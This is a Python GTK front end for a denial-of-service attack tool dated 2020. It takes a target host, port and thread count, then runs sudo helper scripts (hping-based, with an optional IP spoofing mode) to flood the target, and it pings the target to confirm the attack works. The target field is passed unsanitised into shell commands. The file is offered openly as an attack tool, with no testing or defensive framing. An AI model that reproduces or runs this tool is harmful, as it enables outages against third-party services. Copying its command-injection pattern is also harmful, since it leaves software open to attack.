#!/usr/bin/python3
#Denial of service attack tool
#Author : pllechat
#Date : November 2020

import gi
import os
import time
import psutil
gi.require_version('Gtk', '3.0')
from gi.repository import Gtk, GObject

port=80
threads=1
spoof=0
cos=0
C1='\033[31m'
C2='\033[32m'
C3='\033[33m'
C0='\033[0m'
os.system("setterm -cursor off")
os.system("sudo bash banner.sh")

class Name:
	def __init__(self):
		interface = Gtk.Builder()
		interface.add_from_file('graph.glade')
        
		self.clear = interface.get_object("clear")
		interface.connect_signals(self)

		self.start = interface.get_object("start")
		interface.connect_signals(self)

		self.entry1 = interface.get_object("entry1")
		interface.connect_signals(self)

		self.entry2 = interface.get_object("entry2")
		interface.connect_signals(self)

		self.entry3 = interface.get_object("entry3")
		interface.connect_signals(self)

		self.spoof = interface.get_object("spoof")
		interface.connect_signals(self)

		self.infos = interface.get_object("infos")
		interface.connect_signals(self)

		self.cpu = interface.get_object("cpu")
		interface.connect_signals(self)



	def on_mainWindow_destroy(self, widget):
		Gtk.main_quit()


	def on_spoof_toggled(self, widget):
		global spoof
		if spoof==0:
			print("\nIP Spoofing enable")
			print(C0 + "\n_______________________\n")
			spoof=1
		else:
			print("\nIP spoofing disabled ")
			print(C0 + "\n_______________________\n")
			spoof=0


	def on_quit_clicked(self, widget):
		global cos
		if cos == 1:
			cmd = "sudo bash stopX.sh "+str(threads)
			os.system(cmd)
			print(C0 + "\n_______________________\n")
			print(C2 + "\nStopping the attack" +C0)
			print("\n_______________________\n")
			self.infos.set_text("Stopping the Attack")
			self.clear.set_label("Clear")
			cos = 0
		print(C3 + "Quit \n" + C0)
		os.system("setterm -cursor on")
		Gtk.main_quit()


	def on_clear_clicked(self, widget):
		global ip
		global cos
		if cos == 1:
			try:
				print(C3 + "\nTrying to ping", ip," : \n" + C0)
				r = os.system("ping -c 1 " + ip +" >/dev/null 2> /dev/null & ")
				if r == 0:
					print("Target still responds")
					self.infos.set_text("Target still responds")
				else:
					print(C2 + "\nAttack works !" + C0)
					self.infos.set_text("Attack works")
				print(C0 + "\n_______________________\n")
			except:
				print(C2 + "\nAttack works !" + C0)
				self.infos.set_text("Attack works")
				print(C0 + "\n_______________________\n")
		else:
			self.entry1.set_placeholder_text("www.google.com")
			self.entry1.set_text("")
			self.entry2.set_text("")
			self.entry3.set_text("")
			os.system("sudo bash banner.sh")


	def on_entry_activate(self, widget):
		self.infos.set_text("Ready ?")


	def stop(self):
		global cos
		global threads
		cmd = "sudo bash stopX.sh "+str(threads)
		os.system(cmd)
		print(C0 + "\n_______________________\n")
		print(C2 + "\nStopping the attack" +C0)
		print("\n_______________________\n")
		self.entry1.set_text("")
		self.entry2.set_text("")
		self.entry3.set_text("")
		self.infos.set_text("Stopping the Attack")
		self.clear.set_label("Clear")
		self.start.set_label("Start")
		cos = 0
		self.show_cpu()

	def wait(self, time_lapse):
	    time_start = time.time()
	    time_end = (time_start + time_lapse)
	    while time_end > time.time():
	        while Gtk.events_pending():
	            Gtk.main_iteration()


	def show_cpu(self):
		global cos
		if cos == 1 :
			cpu = str(psutil.cpu_percent())
			cpu = cpu[:-2]
			cpu2 = "CPU="+cpu+"%"
			self.cpu.set_text(cpu2)
			self.wait(0.2)
			self.show_cpu()
		elif cos == 0 :
			self.cpu.set_text("")


	def test_ip(self, ip):
		try:
			print("\n_______________________\n")
			print(C3 + "\nTrying to ping", ip," : \n" + C0)
			r = os.system("ping -c 1 " + ip)
			if r == 0:
				print(C2 + "\nAddress found " + C0)
				return 0
			else:
				print(C1 + "Error : Invalid IP or URL (code :", r, ")" + C0)
				self.infos.set_text("Invalid IP or URL")
				return 1
		except:
			print(C1 + "Error : Invalid IP or URL (Something is wrong with the command ping)" + C0)
			self.infos.set_text("Invalid IP or URL")
			return 1


	def test_threads(self, threads):
		if threads < 31 and threads > 0: 
			return 0
		else :
			return 1


	def on_start_clicked(self, widget):
		global ip
		global port
		global threads
		global spoof
		global cos
		self.infos.set_text("...")
		if cos == 0:
			try:
				ip = self.entry1.get_text() 
				port = int(self.entry2.get_text()) 
				threads = int(self.entry3.get_text())
				os.system("sudo bash banner.sh")
				print(C3 + "\nTrying to start..." + C0)
				try:
					if ip == "" or port == "" or threads == "":
						print(C1 + "Error : please complete all fields" + C0)
						self.infos.set_text("Please complete all fields")
					elif self.test_threads(int(threads)) == 1:
						print(C1 + "Error : Number of threads must be between 1 and 40" + C0)
						self.infos.set_text("To much threads")
					elif self.test_ip(ip) == 0 and self.test_threads(int(threads)) == 0:
						print("\n_______________________\n")
						print(C3 + "Values : \n" +C0)
						print("-IP =", ip)
						print("-Port =", port)
						print("-Threads =", threads)
						print("-Spoof =", spoof)
						if spoof == 0:
							print(C2 + "\nStarting the attack..." +C0)
							print("\n_______________________\n")
							self.infos.set_text("Attack in progress")
							self.clear.set_label("Ping")
							self.start.set_label("Stop")
							cos = 1
							cmd="sudo bash hpingX_ns.sh "+str(ip)+" "+str(port)+" "+str(threads)+" "
							os.system(cmd)
							print(C0 + "\n_______________________\n" + C0)
							self.show_cpu()
						else:
							print(C2 + "\nStarting the attack" + C0)
							print("\n_______________________\n")
							self.infos.set_text("Attack in progress")
							self.clear.set_label("Ping")
							self.start.set_label("Stop")
							cos = 1
							cmd="sudo bash hpingX.sh "+str(ip)+" "+str(port)+" "+str(threads)+" "
							os.system(cmd)
							print(C0 + "\n_______________________\n" + C0)
							self.show_cpu()
					else:
						print(C1 + "\nFatal error :" + C0 +" If you tried with an absolute URL, try again without the https://")
						print("\n_______________________\n")
						self.entry1.set_text("")
						self.infos.set_text("Invalid IP or URL")
						self.entry1.set_placeholder_text("Must be a relative URL")
				except:
					print("Error : Invalid IP or URL")
					self.infos.set_text("Invalid IP or URL")
			except:
				print(C3 + "\nTrying to start..." + C0)
				print(C1 + "Error : Port and threads must be numbers" + C0)
				self.infos.set_text("Port and threads must be numbers")
		elif cos == 1:
			self.stop()
		else:
			print(cos)
			print(C1 + "Something wrong with clear/stop" + C0)


if __name__ == "__main__":
	Name()
	Gtk.main()